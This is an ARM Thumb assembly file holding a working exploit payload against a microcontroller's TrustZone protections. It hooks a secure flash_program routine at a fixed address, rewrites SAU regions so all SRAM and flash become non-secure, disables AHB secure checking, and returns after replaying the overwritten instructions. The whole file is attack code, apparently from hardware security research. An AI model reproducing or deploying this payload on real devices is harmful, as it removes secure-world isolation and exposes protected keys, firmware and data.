.syntax unified

@ flash_program:
@ Arguments
@ r0 - config
@ r1 - start
@ r2 - src
@ r3 - len
@

@13007308    2d e9 f8 4f     push       { len, r4, r5, r6, r7, r8, r9, r10, r11, lr  }
@1300730c    93 46           mov        r11,src
@1300730e    98 46           mov        r8,len
@13007310    82 46           mov        r10,config   @ At this point r2, r3, r4, r6, and r10 are all about to be overwritten
@13007312    0e 46           mov        r6,start    
@13007314    4f f4 00 73     mov.w      len,#0x200   
@13007318    42 46           mov        src,r8
@1300731a    01 24           mov        r4,#0x1
@1300731c    00 f0 f4 f9     bl         validate_flash_alignment

nop
.align 8
nop
.align 7
nop
nop
nop
nop
nop
nop

payload:
@ Expects to be called via `bl payload` placed at 0x13007310
@ Assume r2, r3, r4, r6, and r10 are available

@ Load pointer to non-secure constant pool
@ 2 bytes
ldr r6, secure_constant_pool

@ Extend SAU region 1 to all of SRAM
@ 6 bytes
ldmia r6!, {r2, r3, r4}
stmia r2!, {r3, r4}

@ Extend SAU region 0 to all of flash
@ 6 bytes
ldmia r6!, {r2, r3, r4}
stmia r2!, {r3, r4}

@ Disable AHB secure checking
@ 4 bytes
ldmia r6!, {r2, r3, r4}
stmia r2!, {r3, r4}

@ Execute hijacked instruction and return to next instruction
@ 6 bytes
mov r10, r0
mov r6, r1
bx lr

secure_constant_pool:
.word nonsecure_constants_pool

padding:
.align 9
nop
.align 8
nop
nop
nop
nop


flash_program:
push { r3, r4, r5, r6, r7, r8, r9, r10, r11, lr }
mov        r11,r2
mov        r8,r3
bl payload
mov      r3, #0x200   

.align 2

nonsecure_constants_pool:
.word 0xE000EDD8    @ SAU_RNR
.word 0x1
.word 0x20000000
.word 0xE000EDD8    @ SAU_RNR
.word 0x0
.word 0x0
.word 0x500ACFF8    @ Secure AHB MISC_CTRL_DP_REG
.word 0x00002222    @ Value for same
.word 0x00002222    @ Value for same
